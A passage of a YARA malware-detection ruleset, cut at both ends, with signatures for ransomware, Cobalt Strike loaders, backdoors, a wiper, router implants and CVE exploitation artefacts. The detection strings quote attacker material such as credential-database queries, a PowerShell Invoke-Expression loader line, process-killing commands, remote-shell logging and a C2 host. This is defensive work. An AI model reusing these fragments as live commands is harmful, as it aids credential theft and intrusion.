\"1.7\"\n      \n   strings:\n      $x1 = \">>>> Your personal DECRYPTION ID:\" \n   condition: \n      1 of them\n}\n\nrule MAL_SUSP_RANSOM_Lazy_RansomNote_Feb24_RID33FA : CRIME DEMO MAL RANSOM SUSP {\n   meta:\n      description = \"Detects the Lazy ransom note file 'HowToRestoreYourFiles.txt' which is a sign of a Lazy ransomware infection\"\n      author = \"Florian Roth\"\n      reference = \"https://www.huntress.com/blog/slashandgrab-screen-connect-post-exploitation-in-the-wild-cve-2024-1709-cve-2024-1708\"\n      date = \"2024-02-23 15:10:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CRIME, DEMO, MAL, RANSOM, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"All Encrypted files can be reversed to original form and become usable\" \n   condition: \n      1 of them\n}\n\nrule SUSP_MAL_SigningCert_Feb24_1_RID30B3 : CVE_2024_1708 CVE_2024_1709 DEMO EXE FILE MAL SUSP {\n   meta:\n      description = \"Detects PE files signed with a certificate used to sign malware samples mentioned in a HuntressLabs report on the exploitation of ScreenConnect vulnerability CVE-2024-1708 and CVE-2024-1709\"\n      author = \"Florian Roth\"\n      reference = \"https://www.huntress.com/blog/slashandgrab-screen-connect-post-exploitation-in-the-wild-cve-2024-1709-cve-2024-1708\"\n      date = \"2024-02-23 12:51:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"37a39fc1feb4b14354c4d4b279ba77ba51e0d413f88e6ab991aad5dd6a9c231b\"\n      hash2 = \"e8c48250cf7293c95d9af1fb830bb8a5aaf9cfb192d8697d2da729867935c793\"\n      tags = \"CVE_2024_1708, CVE_2024_1709, DEMO, EXE, FILE, MAL, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Wisdom Promise Security Technology Co.\" ascii\n      $s2 = \"Globalsign TSA for CodeSign1\" ascii\n      $s3 = { 5D AC 0B 6C 02 5A 4B 21 89 4B A3 C2 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 70000KB and all of them\n}\n\nrule MAL_CS_Loader_Feb24_1_RID2DF8 : COBALTSTRIKE CVE_2024_1708 CVE_2024_1709 DEMO EXE FILE MAL T1550_002 {\n   meta:\n      description = \"Detects Cobalt Strike malware samples mentioned in a HuntressLabs report on the exploitation of ScreenConnect vulnerability CVE-2024-1708 and CVE-2024-1709\"\n      author = \"Florian Roth\"\n      reference = \"https://www.huntress.com/blog/slashandgrab-screen-connect-post-exploitation-in-the-wild-cve-2024-1709-cve-2024-1708\"\n      date = \"2024-02-23 10:54:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"0a492d89ea2c05b1724a58dd05b7c4751e1ffdd2eab3a2f6a7ebe65bf3fdd6fe\"\n      tags = \"COBALTSTRIKE, CVE_2024_1708, CVE_2024_1709, DEMO, EXE, FILE, MAL, T1550_002\"\n      required_modules = \"pe\"\n      minimum_yara = \"3.2.0\"\n      \n   strings:\n      $s1 = \"Dll_x86.dll\" ascii fullword\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and ( pe.exports ( \"UpdateSystem\" ) and ( pe.imphash ( ) == \"0dc05c4c21a86d29f1c3bf9cc5b712e0\" or $s1 ) )\n}\n\nrule MAL_RANSOM_LockBit_Indicators_Feb24_RID3362 : CRIME CVE_2024_1708 CVE_2024_1709 DEMO EXE MAL RANSOM {\n   meta:\n      description = \"Detects Lockbit ransomware samples mentioned in a HuntressLabs report on the exploitation of ScreenConnect vulnerability CVE-2024-1708 and CVE-2024-1709\"\n      author = \"Florian Roth\"\n      reference = \"https://www.huntress.com/blog/slashandgrab-screen-connect-post-exploitation-in-the-wild-cve-2024-1709-cve-2024-1708\"\n      date = \"2024-02-23 14:45:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"a50d9954c0a50e5804065a8165b18571048160200249766bfa2f75d03c8cb6d0\"\n      tags = \"CRIME, CVE_2024_1708, CVE_2024_1709, DEMO, EXE, MAL, RANSOM\"\n      required_modules = \"pe\"\n      minimum_yara = \"3.2.0\"\n      \n   strings:\n      $op1 = { 76 c1 95 8b 18 00 93 56 bf 2b 88 71 4c 34 af b1 a5 e9 77 46 c3 13 } \n      $op2 = { e0 02 10 f7 ac 75 0e 18 1b c2 c1 98 ac 46 } \n      $op3 = { 8b c6 ab 53 ff 15 e4 57 42 00 ff 45 fc eb 92 ff 75 f8 ff 15 f4 57 42 00 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 500KB and ( pe.imphash ( ) == \"914685b69f2ac2ff61b6b0f1883a054d\" or 2 of them ) or all of them\n}\n\nrule MAL_MSI_Mpyutils_Feb24_1_RID2F5B : CVE_2024_1708 CVE_2024_1709 DEMO FILE MAL {\n   meta:\n      description = \"Detects malicious MSI package mentioned in a HuntressLabs report on the exploitation of ScreenConnect vulnerability CVE-2024-1708 and CVE-2024-1709\"\n      author = \"Florian Roth\"\n      reference = \"https://www.huntress.com/blog/slashandgrab-screen-connect-post-exploitation-in-the-wild-cve-2024-1709-cve-2024-1708\"\n      date = \"2024-02-23 11:53:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"8e51de4774d27ad31a83d5df060ba008148665ab9caf6bc889a5e3fba4d7e600\"\n      tags = \"CVE_2024_1708, CVE_2024_1709, DEMO, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"crypt64ult.exe\" ascii fullword\n      $s2 = \"EXPAND.EXE\" wide fullword\n      $s6 = \"ICACLS.EXE\" wide fullword\n   condition: \n      uint16 ( 0 ) == 0xcfd0 and filesize < 20000KB and all of them\n}\n\nrule MAL_Beacon_Unknown_Feb24_1_RID3043 : COBALTSTRIKE CVE_2024_1708 CVE_2024_1709 DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects malware samples mentioned in a HuntressLabs report on the exploitation of ScreenConnect vulnerability CVE-2024-1708 and CVE-2024-1709 \"\n      author = \"Florian Roth\"\n      reference = \"https://www.huntress.com/blog/slashandgrab-screen-connect-post-exploitation-in-the-wild-cve-2024-1709-cve-2024-1708\"\n      date = \"2024-02-23 12:32:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"6e8f83c88a66116e1a7eb10549542890d1910aee0000e3e70f6307aae21f9090\"\n      hash2 = \"b0adf3d58fa354dbaac6a2047b6e30bc07a5460f71db5f5975ba7b96de986243\"\n      hash3 = \"c0f7970bed203a5f8b2eca8929b4e80ba5c3276206da38c4e0a4445f648f3cec\"\n      tags = \"COBALTSTRIKE, CVE_2024_1708, CVE_2024_1709, DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Driver.dll\" wide fullword\n      $s2 = \"X l.dlT\" ascii fullword\n      $s3 = \"$928c7481-dd27-8e23-f829-4819aefc728c\" ascii fullword\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and 3 of ( $s* )\n}\n\nrule EXPL_CVE_2024_21413_Microsoft_Outlook_RCE_Feb24_RID3674 : CVE_2024_21413 DEMO EXPLOIT {\n   meta:\n      description = \"Detects emails that contain signs of a method to exploit CVE-2024-21413 in Microsoft Outlook\"\n      author = \"X__Junior, Florian Roth\"\n      reference = \"https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability/\"\n      date = \"2024-02-17 16:56:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-02-19\"\n      tags = \"CVE_2024_21413, DEMO, EXPLOIT\"\n      minimum_yara = \"2.2.0\"\n      \n   strings:\n      $a1 = \"Subject: \" \n      $a2 = \"Received: \" \n      $xr1 = /file:\\/\\/\\/\\\\\\\\[^\"']{6,600}\\.(docx|txt|pdf|xlsx|pptx|odt|etc|jpg|png|gif|bmp|tiff|svg|mp4|avi|mov|wmv|flv|mkv|mp3|wav|aac|flac|ogg|wma|exe|msi|bat|cmd|ps1|zip|rar|7z|targz|iso|dll|sys|ini|cfg|reg|html|css|java|py|c|cpp|db|sql|mdb|accdb|sqlite|eml|pst|ost|mbox|htm|php|asp|jsp|xml|ttf|otf|woff|woff2|rtf|chm|hta|js|lnk|vbe|vbs|wsf|xls|xlsm|xltm|xlt|doc|docm|dot|dotm)!/ \n   condition: \n      filesize < 1000KB and all of ( $a* ) and 1 of ( $xr* )\n}\n\nrule PUA_AnyDesk_Compromised_Certificate_Revoked_Jan24_RID39B5 : DEMO EXE FILE {\n   meta:\n      description = \"Detects binaries signed with a compromised signing certificate of AnyDesk (philandro Software GmbH, 0DBF152DEAF0B981A8A938D53F769DB8) after it was revoked. This is not a threat detection. It detects an outdated version of AnyDesk that was signed with a certificate that has been revoked.\"\n      author = \"Florian Roth\"\n      reference = \"https://anydesk.com/en/public-statement\"\n      date = \"2024-02-05 19:15:21\"\n      score = 50\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      required_modules = \"pe\"\n      minimum_yara = \"3.0.0\"\n      \n   condition: \n      uint16 ( 0 ) == 0x5a4d and for any i in ( 0 .. pe.number_of_signatures ) : ( pe.signatures [ i ] . issuer contains \"DigiCert Trusted G4 Code Signing RSA4096 SHA384 2021 CA1\" and pe.signatures [ i ] . serial == \"0d:bf:15:2d:ea:f0:b9:81:a8:a9:38:d5:3f:76:9d:b8\" )\n}\n\nrule APT_UNC5221_Ivanti_ForensicArtifacts_Jan24_1_RID3676 : APT DEMO {\n   meta:\n      description = \"Detects forensic artifacts found in the Ivanti VPN exploitation campaign by APT UNC5221\"\n      author = \"Florian Roth\"\n      reference = \"https://www.mandiant.com/resources/blog/suspected-apt-targets-ivanti-zero-day\"\n      date = \"2024-01-11 16:56:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, DEMO\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"system(\\\"chmod a+x /home/etc/sql/dsserver/sessionserver.sh\\\");\" \n      $x2 = \"SSH-2.0-OpenSSH_0.3xx.\" \n      $x3 = \"sed -i '/retval=$(exec $installer $@)/d' /pkg/do-install\" \n   condition: \n      filesize < 5MB and 1 of them\n}\n\nrule APT_MAL_FalseFont_Backdoor_Jan24_RID3272 : APT DEMO EXE FILE G0064 MAL T1003 {\n   meta:\n      description = \"Detects FalseFont backdoor, related to Peach Sandstorm APT\"\n      author = \"X__Junior, Jonathan Peters\"\n      reference = \"https://twitter.com/MsftSecIntel/status/1737895710169628824\"\n      date = \"2024-01-11 14:05:31\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, DEMO, EXE, FILE, G0064, MAL, T1003\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"Agent.Core.WPF.App\" ascii\n      $x2 = \"3EzuNZ0RN3h3oV7rzILktSHSaHk+5rtcWOr0mlA1CUA=\" wide\n      $x3 = \"viOIZ9cX59qDDjMHYsz1Yw==\" wide\n      $sa1 = \"StopSendScreen\" wide\n      $sa2 = \"Decryption failed :(\" wide\n      $sb1 = \"{0}     {1}     {2}     {3}\" wide\n      $sb2 = \"\\\\BraveSoftware\\\\Brave-Browser\\\\User Data\\\\\" wide\n      $sb3 = \"select * from logins\" wide\n      $sb4 = \"Loginvault.db\" wide\n      $sb5 = \"password_value\" wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and ( 1 of ( $x* ) or all of ( $sa* ) or all of ( $sb* ) or ( 1 of ( $sa* ) and 4 of ( $sb* ) ) )\n}\n\nrule MAL_Backdoor_DLL_Nov23_1_RID2F31 : CVE_2023_4966 DEMO EXE FILE MAL RANSOM {\n   meta:\n      description = \"Detects a backdoor DLL, that was seen being used by LockBit 3.0 affiliates exploiting CVE-2023-4966\"\n      author = \"X__Junior\"\n      reference = \"https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-325a\"\n      date = \"2023-11-23 11:46:41\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"cc21c77e1ee7e916c9c48194fad083b2d4b2023df703e544ffb2d6a0bfc90a63\"\n      hash2 = \"0eb66eebb9b4d671f759fb2e8b239e8a6ab193a732da8583e6e8721a2670a96d\"\n      tags = \"CVE_2023_4966, DEMO, EXE, FILE, MAL, RANSOM\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"ERROR GET INTERVAL\" ascii\n      $s2 = \"OFF HIDDEN MODE\" ascii\n      $s3 = \"commandMod:\" ascii\n      $s4 = \"RESULT:\" ascii\n      $op1 = { C7 44 24 ?? 01 00 00 00 C7 84 24 ?? ?? ?? ?? FF FF FF FF 83 7C 24 ?? 00 74 ?? 83 BC 24 ?? ?? ?? ?? 00 74 ?? 4C 8D 8C 24 ?? ?? ?? ?? 41 B8 00 04 00 00 48 8D 94 24 ?? ?? ?? ?? 48 8B 4C 24 ?? FF 15 } \n      $op2 = { 48 C7 44 24 ?? 00 00 00 00 C7 44 24 ?? 00 00 00 00 C7 44 24 ?? 03 00 00 00 48 8D 0D ?? ?? ?? ?? 48 89 4C 24 ?? 4C 8D 0D ?? ?? ?? ?? 44 0F B7 05 ?? ?? ?? ?? 48 8B D0 48 8B 4C 24 ?? FF 15 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and ( all of ( $s* ) or all of ( $op* ) )\n}\n\nrule MAL_Trojan_DLL_Nov23_RID2DEA : CVE_2023_4966 DEMO EXE FILE MAL RANSOM {\n   meta:\n      description = \"Detects a trojan DLL that installs other components - was seen being used by LockBit 3.0 affiliates exploiting CVE-2023-4966\"\n      author = \"X__Junior\"\n      reference = \"https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-325a\"\n      date = \"2023-11-23 10:52:11\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"e557e1440e394537cca71ed3d61372106c3c70eb6ef9f07521768f23a0974068\"\n      tags = \"CVE_2023_4966, DEMO, EXE, FILE, MAL, RANSOM\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $op1 = { C7 84 24 ?? ?? ?? ?? 52 70 63 53 C7 84 24 ?? ?? ?? ?? 74 72 69 6E C7 84 24 ?? ?? ?? ?? 67 42 69 6E C7 84 24 ?? ?? ?? ?? 64 69 6E 67 C7 84 24 ?? ?? ?? ?? 43 6F 6D 70 C7 84 24 ?? ?? ?? ?? 6F 73 65 41 C7 84 24 ?? ?? ?? ?? 00 40 01 01 } \n      $op2 = { C7 84 24 ?? ?? ?? ?? 6C 73 61 73 C7 84 24 ?? ?? ?? ?? 73 70 69 72 66 C7 84 24 ?? ?? 00 00 70 63 } \n      $op3 = { C7 84 24 ?? ?? ?? ?? 4E 64 72 43 C7 84 24 ?? ?? ?? ?? 6C 69 65 6E C7 84 24 ?? ?? ?? ?? 74 43 61 6C C7 84 24 ?? ?? ?? ?? 6C 33 00 8D } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and all of them\n}\n\nrule MAL_DLL_Stealer_Nov23_RID2E4C : CVE_2023_4966 DEMO EXE FILE MAL RANSOM {\n   meta:\n      description = \"Detects a DLL that steals authentication credentials - was seen being used by LockBit 3.0 affiliates exploiting CVE-2023-4966\"\n      author = \"X__Junior\"\n      reference = \"https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-325a\"\n      date = \"2023-11-23 11:08:31\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"17a27b1759f10d1f6f1f51a11c0efea550e2075c2c394259af4d3f855bbcc994\"\n      tags = \"CVE_2023_4966, DEMO, EXE, FILE, MAL, RANSOM\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $op1 = { C7 45 ?? 4D 69 6E 69 C7 45 ?? 44 75 6D 70 C7 45 ?? 57 72 69 74 C7 45 ?? 65 44 75 6D C7 45 ?? 70 00 27 00 C7 45 ?? 44 00 62 00 C7 45 ?? 67 00 68 00 C7 45 ?? 65 00 6C 00 C7 45 ?? 70 00 2E 00 C7 45 ?? 64 00 6C 00 C7 45 ?? 6C 00 00 00} \n   condition: \n      uint16 ( 0 ) == 0x5a4d and all of them\n}\n\nrule MAL_Python_Backdoor_Script_Nov23_RID331B : CVE_2023_4966 DEMO MAL RANSOM SCRIPT T1059_006 {\n   meta:\n      description = \"Detects a trojan (written in Python) that communicates with c2 - was seen being used by LockBit 3.0 affiliates exploiting CVE-2023-4966\"\n      author = \"X__Junior\"\n      reference = \"https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-325a\"\n      date = \"2023-11-23 14:33:41\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"906602ea3c887af67bcb4531bbbb459d7c24a2efcb866bcb1e3b028a51f12ae6\"\n      tags = \"CVE_2023_4966, DEMO, MAL, RANSOM, SCRIPT, T1059_006\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"port = 443 if \\\"https\\\"\" ascii\n      $s2 = \"winrm.Session basic error\" ascii\n      $s3 = \"Windwoscmd.run_cmd(str(cmd))\" ascii\n   condition: \n      filesize < 50KB and all of them\n}\n\nrule APT_RANSOM_Lockbit_ForensicArtifacts_Nov23_RID367C : APT DEMO RANSOM T1021_002 {\n   meta:\n      description = \"Detects patterns found in Lockbit TA attacks exploiting Citrixbleed vulnerability CVE 2023-4966\"\n      author = \"Florian Roth\"\n      reference = \"https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-325a\"\n      date = \"2023-11-22 16:57:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, DEMO, RANSOM, T1021_002\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"taskkill /f /im sqlwriter.exe /im winmysqladmin.exe /im w3sqlmgr.exe\" \n      $x2 = \" 1> \\\\\\\\127.0.0.1\\\\admin$\\\\__\" \n   condition: \n      1 of ( $x* )\n}\n\nrule APT_PS1_SysAid_EXPL_ForensicArtifacts_Nov23_1_RID372D : APT CVE_2023_47246 DEMO EXPLOIT SCRIPT T1059_001 {\n   meta:\n      description = \"Detects forensic artifacts found in attacks on SysAid on-prem software exploiting CVE-2023-47246\"\n      author = \"Florian Roth\"\n      reference = \"https://www.sysaid.com/blog/service-desk/on-premise-software-security-vulnerability-notification\"\n      date = \"2023-11-09 17:27:21\"\n      score = 85\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, CVE_2023_47246, DEMO, EXPLOIT, SCRIPT, T1059_001\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"if ($s -match '^(Sophos).*\\\\.exe\\\\s') {echo $s; $bp++;}\" ascii wide\n      $x2 = \"$s=$env:SehCore;$env:SehCore=\\\"\\\";Invoke-Expression $s;\" ascii wide\n   condition: \n      1 of them\n}\n\nrule MAL_Loader_TurtleLoader_Nov23_RID31CE : CVE_2023_47246 DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects Turtle loader used in attacks against SysAid CVE-2023-47246\"\n      author = \"Florian Roth\"\n      reference = \"https://www.sysaid.com/blog/service-desk/on-premise-software-security-vulnerability-notification\"\n      date = \"2023-11-09 13:38:11\"\n      score = 85\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"b5acf14cdac40be590318dee95425d0746e85b1b7b1cbd14da66f21f2522bf4d\"\n      tags = \"CVE_2023_47246, DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"No key in args!\" ascii fullword\n      $s2 = \"Bad data file!\" ascii fullword\n      $s3 = \"Data file loaded. Running...\" ascii\n      $op1 = { 48 8d 55 c8 4c 8d 3d ac 8f 00 00 45 33 c9 45 33 d2 4d 8b e7 44 21 0a 45 33 db 4c 8d 3d 16 ec ff ff } \n      $op2 = { 48 d3 e8 0f b6 c8 49 03 cb 49 81 c3 00 01 00 00 45 33 8c 8f a0 e4 00 00 41 83 fa 04 7c c7 41 ff c0 } \n      $op3 = { 48 83 c1 04 48 ff ca 89 41 1c 75 ef 03 f6 48 83 c3 20 48 ff cd 0f 85 77 ff ff ff } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and 3 of them\n}\n\nrule MAL_WIPER_BiBi_Oct23_RID2D70 : DEMO EXE FILE LINUX MAL {\n   meta:\n      description = \"Detects BiBi wiper samples for Windows and Linux\"\n      author = \"Florian Roth\"\n      reference = \"https://x.com/ESETresearch/status/1719437301900595444?s=20\"\n      date = \"2023-10-30 10:31:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2023-11-01\"\n      hash1 = \"23bae09b5699c2d5c4cb1b8aa908a3af898b00f88f06e021edcb16d7d558efad\"\n      hash2 = \"40417e937cd244b2f928150cae6fa0eff5551fdb401ea072f6ecdda67a747e17\"\n      tags = \"DEMO, EXE, FILE, LINUX, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"send attempt while closed\" ascii fullword\n      $s2 = \"[+] CPU cores: %d, Threads: %d\" ascii fullword\n      $s3 = \"[+] Stats: %d | %d\" ascii fullword\n      $opw1 = { 33 c0 88 45 48 b8 01 00 00 00 86 45 48 45 8b f5 48 8d 3d de f5 ff ff 0f 57 c9 f3 0f 7f 4d b8 } \n      $opw2 = { 2d ce b5 00 00 c5 fa e6 f5 e9 40 fe ff ff 0f 1f 44 00 00 75 2e c5 fb 10 0d 26 b4 00 00 44 8b 05 5f b6 00 00 e8 ca 0d 00 00 } \n      $opl1 = { 4c 8d 44 24 08 48 89 f7 48 ff c2 48 83 c6 04 e8 c7 fb ff ff 41 89 c1 0f b6 42 ff 41 0f af c1 } \n      $opl2 = { e8 6f fb ff ff 49 8d 78 f8 89 c0 48 01 c2 48 89 15 09 fb 24 00 e8 5a fb ff ff 49 8d 78 fc 6b f0 06 } \n   condition: \n      ( uint16 ( 0 ) == 0x5a4d or uint16 ( 0 ) == 0x457f ) and filesize < 4000KB and 2 of them\n}\n\nrule SUSP_THOR_Unsigned_Oct23_1_RID300E : DEMO EXE FILE SUSP {\n   meta:\n      description = \"Detects unsigned version of THOR scanner, which could be a backdoored / modified version of the scanner\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2023-10-28 12:23:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE, SUSP\"\n      required_modules = \"pe\"\n      minimum_yara = \"3.0.0\"\n      \n   strings:\n      $s1 = \"THOR APT Scanner\" wide fullword\n      $s2 = \"Nextron Systems GmbH\" wide fullword\n      $sc1 = { 00 4F 00 72 00 69 00 67 00 69 00 6E 00 61 00 6C 00 46 00 69 00 6C 00 65 00 6E 00 61 00 6D 00 65 00 00 00 74 00 68 00 6F 00 72 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and all of them and pe.number_of_signatures == 0\n}\n\nrule SUSP_EXPL_LIBCUE_CVE_2023_43641_Oct23_1_RID3245 : CVE_2023_43641 DEMO EXPLOIT SUSP {\n   meta:\n      description = \"Detects a suspicious .cue file that could be an exploitation attempt of libcue vulnerability CVE-2023-43641\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/github/securitylab/blob/main/SecurityExploits/libcue/track_set_index_CVE-2023-43641/README.md\"\n      date = \"2023-10-27 13:58:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CVE_2023_43641, DEMO, EXPLOIT, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $a1 = \"TRACK \" \n      $a2 = \"FILE \" \n      $s1 = \"INDEX 4294\" \n   condition: \n      filesize < 100KB and all of them\n}\n\nrule MAL_LNX_CamaroDragon_Sheel_Oct23_RID3283 : DEMO LINUX MAL {\n   meta:\n      description = \"Detects CamaroDragon's tool named sheel\"\n      author = \"Florian Roth\"\n      reference = \"https://research.checkpoint.com/2023/the-dragon-who-sold-his-camaro-analyzing-custom-router-implant/\"\n      date = \"2023-10-06 14:08:21\"\n      score = 85\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"7985f992dcc6fcce76ee2892700c8538af075bd991625156bf2482dbfebd5a5a\"\n      tags = \"DEMO, LINUX, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"-h server_ip -p server_port -i update_index[0-4] [-r]\" ascii fullword\n      $s1 = \"read_ip\" ascii fullword\n      $s2 = \"open fail.%m\" ascii fullword\n      $s3 = \"ri:h:p:\" ascii fullword\n      $s4 = \"update server list success!\" ascii fullword\n   condition: \n      uint16 ( 0 ) == 0x457f and filesize < 30KB and ( 1 of ( $x* ) or 3 of them ) or 4 of them\n}\n\nrule MAL_LNX_CamaroDragon_HorseShell_Oct23_RID348B : DEMO LINUX MAL {\n   meta:\n      description = \"Detects CamaroDragon's HorseShell implant for routers\"\n      author = \"Florian Roth\"\n      reference = \"https://research.checkpoint.com/2023/the-dragon-who-sold-his-camaro-analyzing-custom-router-implant/\"\n      date = \"2023-10-06 15:35:01\"\n      score = 85\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"998788472cb1502c03675a15a9f09b12f3877a5aeb687f891458a414b8e0d66c\"\n      tags = \"DEMO, LINUX, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"echo \\\"start shell '%s' failed!\\\" > .remote_shell.log\" ascii fullword\n      $x2 = \"*****recv NET_REQ_HORSE_SHELL REQ_CONNECT_PORT*****\" ascii fullword\n      $s1 = \"m.cremessage.com\" ascii fullword\n      $s2 = \"POST http://%s/index.php HTTP/1.1\" ascii fullword\n      $s3 = \"wzsw_encrypt_buf\" ascii fullword\n      $s4 = \"body:%d-%s\" ascii fullword\n      $s5 = \"User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident\" ascii fullword\n      $s6 = \"process_http_read_events\" ascii fullword\n      $op1 = { c4 34 42 00 02 30 63 00 40 10 60 00 09 ae 62 00 48 8e 62 00 cc } \n      $op2 = { 27 f4 8c 46 27 f0 03 20 f8 09 00 60 28 21 } \n   condition: \n      uint16 ( 0 ) == 0x457f and filesize < 600KB and ( 1 of ( $x* ) or 3 of them ) or 5 of them\n}\n\nrule LOG_EXPL_SUSP_TeamCity_CVE_2023_42793_Oct23_1_RID34F9 : CVE_2023_42793 DEMO EXPLOIT LOG SUSP {\n   meta:\n      description = \"Detects log entries that could indicate a successful exploitation of CVE-2023-42793 on TeamCity servers\"\n      author = \"Florian Roth\"\n      reference = \"https://attackerkb.com/topics/1XEEEkGHzt/cve-2023-42793/rapid7-analysis\"\n      date = \"2023-10-02 15:53:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CVE_2023_42793, DEMO, EXPLOIT, LOG, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $sa1 = \"File edited: \" \n      $sa2 = \"\\\\TeamCity\\\\config\\\\internal.properties by user with id=\" \n      $sb1 = \"s.buildServer.ACTIVITIES.AUDIT - server_file_change: File \" \n      $sb2 = \"\\\\TeamCity\\\\config\\\\internal.properties was modified by \\\"user with id\" \n   condition: \n      all of ( $sa* ) or all of ( $sb* )\n}\n\nrule LOG_EXPL_SUSP_TeamCity_Oct23_1_RID312E : DEMO EXPLOIT LOG SUSP T1033 {\n   meta:\n      description = \"Detects log entries that could indicate a successful exploitation of TeamCity servers\"\n      author = \"Florian Roth\"\n      reference = \"https://attackerkb.com/topics/1XEEEkGHzt/cve-2023-42793/rapid7-analysis\"\n      date = \"2023-10-02 13:11:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXPLOIT, LOG, SUSP, T1033\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $a1 = \"tbrains.buildServer.ACTIVITIES\" \n      $s1 = \"External process is launched by user user with id\" \n      $s2 = \". Command line: cmd.exe \\\"/c whoami\" \n   condition: \n      all of them\n}\n\nrule HKTL_EXPL_POC_PY_SharePoint_CVE_2023_29357_Sep23_1_RID36C9 : CVE_2023_29357 DEMO EXPLOIT HKTL SCRIPT T1059_006 {\n   meta:\n      description = \"Detects a Python POC to exploit CVE-2023-29357 on Microsoft SharePoint servers\"\n      author = \"Florian Roth\"\n      reference = 